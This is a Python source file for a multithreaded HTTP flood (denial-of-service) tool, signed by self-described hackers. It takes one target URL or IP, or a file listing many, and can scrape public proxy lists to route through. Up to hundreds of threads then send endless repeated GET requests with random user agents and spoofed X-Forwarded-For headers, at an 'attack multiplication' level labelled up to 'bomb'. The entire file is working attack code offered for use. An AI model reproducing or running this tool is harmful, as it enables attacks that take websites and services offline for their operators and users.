#!/bin/python
# standard library
#import socks
import socket, time, threading, random, re, urllib.request ,os, sys, asyncio
# check modules
_aouthor_ = 'mr root and a hacker anonymus'
_version_ = 'max'
_id_ = '@THEserver'
try:
    import pyuseragents
except ModuleNotFoundError:
    os.system('pip install pyuseragents')
    import pyuseragents
try:
    import pyfiglet
except ModuleNotFoundError:
    os.system('pip install pyfiglet')
    import pyfiglet
try:
    os.system('clear')
except:
    os.system('cls')
logo = ['D-DOS','DDOSER','POWERFULL','powerfull','strong']
banner = (random.choice(logo))
bnr = pyfiglet.figlet_format(banner)
print('\033[92m')
for bnrs in bnr:
    print(bnrs , flush = True , end = '')
    time.sleep(0.01)
print('\n\033[95m')
try:
    os.system('date')
except:
    pass
time.sleep(1)
while 1:
    useragents : list = [pyuseragents.random(), pyuseragents.random()]
    async def starturl():
        global url
        global url2
        global urlport
        global choice1
        global ips
        choice1 = input("\n\033[31m[?] \033[36mmethods \033[20;37m:>\n\n\033[31m[+] \033[36mmore target \033[20;37m> \033[31m[\033[92m1\033[31m]\n\033[31m[+] \033[36mone target \033[20;37m> \033[31m [\033[92m2\033[31m]\n\n\033[31m\t[#] \033[36mtype number method \033[31m_> \033[0m")
        if choice1 == "1":
            ip_file = input("\n\033[31m[?] \033[36menter txt file of ips or urls \033[31m_> \033[0m")
            ips = open(ip_file).readlines()
        else:
            url = input("\n\033[31m[?] \033[36menter \033[31m[U.R.L.] \033[36m or \033[31m[IP] \033[36mtarget \033[31m_> \033[20;37m").strip()
            if url == "":
                print ("\n\033[31m[!]\t\033[35mplease enter the url or ip.\n")
                starturl()
            try:
                if url[0]+url[1]+url[2]+url[3] == "www.":
                    url = "http://" + url
                elif url[0]+url[1]+url[2]+url[3] == "http":
                    pass
                else:
                    url = "http://" + url
            except:
                print("\n\033[31m[!] \033[35myou mistyped, try again.\n")
                starturl()
            try:
                url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
            except:
                url2 = url.replace("http://", "").replace("https://", "").split("/")[0]

            try:
                urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
            except:
                urlport = "80"
        proxymode()
    def proxymode():
        global choice2
        choice2 = input("\n\033[31m[?] \033[36muse \033[31m[proxy list] \033[20;37m[y/n] \033[36m_> \033[0m")
        if choice2 == "y".lower():
            choiceproxysocks()
        else:
            numthreads()
    def choiceproxysocks():
        global choice3
        choice3 = input("\n\033[31m[?] \033[36mtype \033[31m'1' \033[36mfor [http] proxy \033[20;37m| \033[36mtype \033[31m'2'\033[36m for [socks] proxy \033[31m_> \033[0m")
        if choice3 == "1":
            choicedownproxy()
        elif choice3 == "2":
            choicedownsocks()
        else:
            print ("\n\033[31m[!] \033[35myou mistyped, try again.\n")
            choiceproxysocks()
    def choicedownproxy():
        choice4 = input("\n\033[31m[+] \033[36mdownload proxy list \033[20;37m[y/n] \033[31m_> \033[0m")
        if choice4 == "y".lower():
            urlproxy = "http://free-proxy-list.net/"
            proxyget(urlproxy)
        else:
            proxylist()
    def choicedownsocks():
        choice4 = input("\n\033[31m[+] \033[36mdownload proxy list \033[20;37m[y/n] \033[31m_> \033[0m")
        if choice4 == "y".lower():
            urlproxy = "https://www.socks-proxy.net/"
            proxyget(urlproxy)
        else:
            proxylist()
    def proxyget(urlproxy):
        try:
            req = urllib.request.Request(("%s") % (urlproxy))
            req.add_header("User-Agent", random.choice(useragents))
            sourcecode = urllib.request.urlopen(req)
            part = str(sourcecode.read())
            part = part.split("<tbody>")
            part = part[1].split("</tbody>")
            part = part[0].split("<tr><td>")
            proxies = ""
            for proxy in part:
                proxy = proxy.split("</td><td>")
                try:
                    proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
                except:
                    pass
            out_file = open("proxy.txt","w")
            out_file.write("")
            out_file.write(proxies)
            out_file.close()
            print ("\n\033[31m[*] \033[36mproxies list downloaded successfully and saved in \033[31m[proxy.txt]\n")
        except:
            print ("\n\033[31m[!] error\n")
        proxylist()
    def proxylist():
        global proxies
        out_file = str(input("\n\033[31m[?] \033[36menter the proxylist \033[31m[ directory/file ] \033[36m[proxy.txt] \033[31m_> \033[0m"))
        if out_file == "":
            print('\n\033[31m[!] \033[35mplease enter your file proxy.\n')
            proxylist()
        try:
            proxies = open(out_file, 'r').read().split()
        except:
            while True:
                try:
                    print(f'\n\033[31m[!] \033[35m{out_file} not found!, please enter your file proxy.\n')
                    out_file = str(input("\n\033[31m[?] \033[36menter the proxylist \033[31m[ directory/file ] \033[36m[proxy.txt] \033[31m_> \033[0m"))
                    proxies = open(out_file, 'r').read().split()
                    break
                except:
                    pass
        proxies = open(out_file, 'r').read().split()
        numthreads()
    def numthreads():
        global threads
        try:
            threads = int(input("\n\033[31m[?]\033[36menter number of threads \033[20;37m[800] \033[31m_> \033[0m"))
        except ValueError:
            threads = 800
            print ("\n\033[31m[*] \033[35m[800] threads selected.\n")
        multiplication()
    def multiplication():
        global multiple
        try:
            multiple = int(input("\n\033[31m[?] \033[36menter a number of multiplication for the attack \033[20;37m[(1-5=normal)(50=powerful)(100 or more=bomb)] \033[31m_> \033[0m"))
        except ValueError:
            multiple = int(100)
        begin()
    def begin():
        loop()
    def loop():
        global threads
        global acceptall
        global connection
        global go
        global x     
        acceptall = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
        "Accept-Encoding: gzip, deflate\r\n", 
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        ]
        connection = "Connection: Keep-Alive\r\n"
        x = 0
        go = threading.Event()
        if choice2 == "y".lower():
            if choice3 == "1":
                for x in range(threads):
                    RequestProxyHTTP(x+1).start()
                    print ("\n\033[31m[*] \033[93mthread \033[31m" + str(x) + "\033[36m ready")
                go.set()
            else:
                for x in range(threads):
                    RequestSocksHTTP(x+1).start()
                    print ("\n\033[31m[*] \033[93mthread \033[31m" + str(x) + "\033[36m ready")
                go.set()
        else:
            for x in range(threads):
                RequestDefaultHTTP(x+1).start()
                print ("\n\033[31m[*] \033[93mthread \033[31m" + str(x) + "\033[36m ready")
            go.set()
    class RequestProxyHTTP(threading.Thread):
        def __init__(self, counter):
            threading.Thread.__init__(self)
            self.counter = counter
        def run(self):
            useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
            accept = random.choice(acceptall)
            randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
            forward = "X-Forwarded-For: " + randomip + "\r\n"
            if choice1 == "1":
                ip = random.choice(ips)
                get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
            else:
                get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
            request = get_host + useragent + accept + forward + connection + "\r\n" # ecco la final request
            current = x
            if current < len(proxies):
                proxy = proxies[current].strip().split(':')
            else:
                proxy = random.choice(proxies).strip().split(":")
            go.wait()
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(proxy[0]), int(proxy[1])))
                    s.send(str.encode(request))
                    print ("\n\033[31m[+] \033[92mrequests sent \033[31m=> \033[20;37m" + str(proxy[0]+":"+proxy[1]) + "\033[31m @\033[92m", self.counter) # print delle richieste
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
                        s.close()
                except:
                    s.close()
    class RequestSocksHTTP(threading.Thread):
        def __init__(self, counter):
            threading.Thread.__init__(self)
            self.counter = counter
        def run(self):
            useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
            accept = random.choice(acceptall)
            if choice1 == "1":
                ip = random.choice(ips)
                get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
            else:
                get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
            request = get_host + useragent + accept + connection + "\r\n"
            current = x
            if current < len(proxies):
                proxy = proxies[current].strip().split(':')
            else:
                proxy = random.choice(proxies).strip().split(":")
            go.wait()
            #try:
                #socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
                #s = socks.socksocket()
                #s.connect((str(url2), int(urlport)))
                #s.send (str.encode(request))
                #print ("\033[31m[!] \033[92mrequest sent \033[31m=> \033[20;37m" + str(proxy[0]+":"+proxy[1]) + "\033[31m @\033[20;37m", self.counter)
                #try:
                    #for y in range(multiple):
                        #s.send(str.encode(request))
                #except:
                    #s.close()
            #except:
                #print ("\n\033[31m[!]\t\033[35msock down retrying request \033[31m@\033[20;37m", self.counter)
                #s.close()
    class RequestDefaultHTTP(threading.Thread):
        def __init__(self, counter):
            threading.Thread.__init__(self)
            self.counter = counter
        def run(self):
            useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
            accept = random.choice(acceptall)
            if choice1 == "1":
                ip = random.choice(ips)
                get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
            else:
                get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
            request = get_host + useragent + accept + connection + "\r\n"
            go.wait()
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(url2), int(urlport)))
                    s.send (str.encode(request))
                    print ("\n\033[31m[+] \033[92mrequests sent \033[31m=> \033[20;37m", self.counter)
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
                        s.close()
                except:
                    s.close()
    if __name__ == '__main__':
        asyncio.run(starturl())
#....................................[end]...................................